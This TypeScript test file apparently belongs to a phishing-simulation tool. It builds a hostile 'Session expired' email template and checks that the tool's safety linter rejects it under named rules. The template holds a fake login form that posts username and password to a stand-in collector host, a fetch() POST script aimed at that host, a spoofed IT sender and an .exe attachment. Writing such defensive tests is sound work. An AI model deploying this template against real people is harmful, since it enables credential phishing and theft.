import { BRAND, Channel, LintStatus, Scenario, type TemplateMeta } from '@chetna/core';
import { runLint } from './lint';

/**
 * The credential canary.
 *
 * A safeguard nobody tests is a safeguard nobody has. Every run of
 * `verify:safety` builds the most hostile template we can think of — a password
 * field, named inputs, a form posting to an external host, a fetch() call, a
 * script, an email address in the URL, an executable attachment — and asserts
 * that the linter refuses it and names each rule.
 *
 * If this ever passes, the non-collection claim is void and CI must fail.
 */
const HOSTILE_HTML = `
<div>
  <h1>Session expired</h1>
  <form action="https://collector.example.com/steal" method="post">
    <input type="text" name="username" autocomplete="username" />
    <input type="password" name="password" autocomplete="current-password" />
    <textarea name="notes"></textarea>
    <button type="submit" formaction="https://collector.example.com/alt">Sign in</button>
  </form>
  <a href="https://portal.example.com/login?email=priya.r@nimbus.test">Continue</a>
  <img src="https://cdn.example.com/logo.png" />
  <script>fetch('https://collector.example.com', { method: 'POST' });</script>
  <div onclick="document.location='javascript:void(0)'">x</div>
</div>`;

const HOSTILE_META: TemplateMeta = {
  name: 'canary',
  channel: Channel.EMAIL,
  scenario: Scenario.SPEARPHISHING_LINK,
  subject: 'Session expired',
  fromName: 'IT Service Desk',
  fromAddress: 'it@nimbus.test',
  watermarkId: 'not-a-valid-watermark',
  hasSimulationHeaders: false,
  attachments: [{ filename: 'invoice.exe', contentType: 'application/x-msdownload' }],
};

export interface CanaryResult {
  passed: boolean;
  blockedBy: string[];
  missed: string[];
  detail: string;
}

/** Rules the hostile template MUST trip. */
const MUST_TRIP = [
  'SL001_NO_PASSWORD_INPUT',
  'SL002_NO_NAMED_INPUT',
  'SL003_NO_FORM_ACTION',
  'SL004_NO_EXTERNAL_POST',
  'SL005_NO_SCRIPT',
  'SL006_WATERMARK_PRESENT',
  'SL007_KILL_LINK_PRESENT',
  'SL009_NO_ATTACHMENT_PAYLOAD',
  'SL010_NO_PII_IN_URL',
];

export function runCredentialCanary(): CanaryResult {
  const result = runLint(HOSTILE_HTML, HOSTILE_META);
  const tripped = new Set(result.findings.map((f) => f.ruleId));
  const missed = MUST_TRIP.filter((id) => !tripped.has(id));
  const passed = result.status === LintStatus.FAIL && missed.length === 0;
  return {
    passed,
    blockedBy: [...tripped].sort(),
    missed,
    detail: passed
      ? `Hostile template rejected by ${tripped.size} rules. ${BRAND.name} cannot persist a credential-collecting template.`
      : `CANARY FAILED. Rules that should have fired but did not: ${missed.join(', ') || '(none)'}; lint status was ${result.status}.`,
  };
}

export const CANARY_HTML = HOSTILE_HTML;
export const CANARY_META = HOSTILE_META;
